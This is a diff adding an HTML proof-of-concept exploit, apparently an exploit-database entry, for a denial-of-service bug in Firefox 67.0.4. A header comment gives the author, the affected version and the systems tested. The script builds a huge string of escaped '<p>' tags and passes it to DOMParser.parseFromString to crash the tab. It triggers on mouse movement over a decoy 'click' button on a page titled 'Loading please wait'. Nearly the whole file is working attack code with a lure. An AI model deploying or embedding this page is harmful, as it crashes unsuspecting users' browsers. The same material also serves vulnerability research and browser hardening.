@@ -1,0 +1,52 @@
+<!--
+  Exploit Title: DOMParser Denial of Service on Firefox 67.0.4 
+
+  Date: 09/07/2019
+
+  Description: pass a huge string as an argument to DOMParser.parseFromString will crash the tab in Firefox version 67.0.4.
+
+  Exploit Author:Tejas Ajay Naik  
+
+  Vendor Homepage: 
+
+  Software Link: https://ftp.mozilla.org/pub/firefox/releases/
+
+  Version: 67.0.4
+
+  Tested On: Linux x86,Windows x64 1803  
+
+  CVE:
+-->
+<!DOCTYPE html>
+<head>
+  <title>
+    Loading please wait
+  </title>
+  
+  <script>
+    function MyFun() {
+    
+    var text = [];
+    for(var i=0 ;i<300 ; ++i)
+      text += "<\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70>"+
+              "<\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70>"+
+              "<\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70>"+
+              "<\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70>"+
+              "<\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70>"+
+              "<\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70>"+
+              "<\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70>"+
+              "<\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70>"+
+              "<\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70>"+
+              "<\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70><\x70>";
+      var domparser = new DOMParser();
+      var doc = domparser.parseFromString(text,"application/xhtml+xml");
+  }
+  </script>
+
+</head>
+
+<body>
+  <input type="button" onmousemove="MyFun()" value="click"/>
+  <p id="demo"></p>
+</body>  
+</html>
